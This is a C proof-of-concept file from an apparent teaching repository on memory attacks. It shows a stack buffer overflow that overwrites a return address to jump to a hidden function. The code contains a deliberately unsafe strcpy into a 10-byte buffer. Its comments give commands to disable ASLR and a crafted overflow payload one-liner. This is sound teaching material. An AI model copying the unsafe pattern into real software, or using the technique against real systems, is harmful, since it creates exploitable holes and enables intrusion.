/*
 * Filename: 3_returnaddressoverwrite.c
 * Author: @charlieMKR, https://makemyday.io
 *
 * The goal of this code is to ilustrate how return address can be overwritten through buffer overflow.
 *
 * Compile with: gcc -O0 -m32 -fno-stack-protector -ggdb -o returnaddressoverwrite.o 3_returnaddressoverwrite.c
 *
 * IMPORTANT: YOU WILL NEED TO DISABLE ASLR FOR THIS PoC TO WORK.
 * PLEASE REMEMBER TO ENABLE IT AGAIN AFTER TESTING
 * - DISABLE: echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
 * - ENABLE: echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
 *
 * This code is part of the Memory Attacks repository at https://github.com/charlieMKR/memory-attacks
 */

#include <stdio.h>
#include <string.h>
#include <unistd.h>

char *secret() {
	printf("The answer is 42\n");
}

char *answer(char *charArray) {
	char *HARDCODEDPASS = "Whatever\n"; // Address will be stored in the stack
	char overflowable[10];
	strcpy(overflowable, charArray);
	if(strcmp(overflowable,HARDCODEDPASS) == 0){
		secret();
	} else {
		printf("Sorry, wrong password!\n");
	}

}

int main(){
	char password[40];
	sleep(5); // Give time for gdb to attach: sudo gdb -p $(pgrep localvarover)
	printf("Enter the password to unlock the answer to life, the universe and everything: ");
	/* Steps:
	 * 1. Use "AAAAAAAAA" input and examine the stack with GDB
	 * 2. Get the stack address of overflowable local, get address of secret() function
	 * 3. Run again and overflow with: echo $(python -c 'print("\x41"*10 + "\x80\xd0\xff\xff" + "\x41"*12 + "\x31\x85\x04\x08")') | ./returnaddressoverwrite.o
	 * where the first blob of  4 bytes is the address of overflowable local in the stack,
	 * and the second blob of 4 bytes is the address of the secret() function.
	 * 4. Enjoy the answer of life (and the segmentation fault)
	*/
	fgets(password, 40, stdin);
	answer(password);
	printf("Exiting!\n");
	return 0;
}

